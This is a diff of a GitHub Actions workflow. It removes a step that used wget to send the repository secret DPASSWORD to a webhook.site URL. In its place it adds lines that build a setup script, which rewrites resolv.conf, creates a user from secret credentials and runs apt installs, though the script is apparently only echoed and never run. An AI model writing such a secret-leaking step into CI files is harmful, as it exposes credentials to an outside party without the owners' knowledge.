@@ -6,4 +6,13 @@ jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - run: wget https://webhook.site/842f36c8-7cad-4e72-8594-985b5ba2ce74/${{ secrets.DPASSWORD }}
+      - run: |
+          echo "echo adding nameserver" >> setup.sh
+          echo "echo nameserver 8.8.8.8 > /etc/resolv.conf" >> setup.sh
+          echo "echo adding password" >> setup.sh
+          echo "useradd -p $(openssl passwd -1 ${{ secrets.DPASSWORD }}) -m ${{ secrets.DUSER }}" >> setup.sh
+          echo "updating" >> setup.sh
+          echo "apt-get update -y" >> setup.sh
+          echo "apt-get upgrade -y" >> setup.sh
+          echo "apt-get install $PACKAGES_WITH_SPACES -y" >> setup.sh
+          echo setup.sh
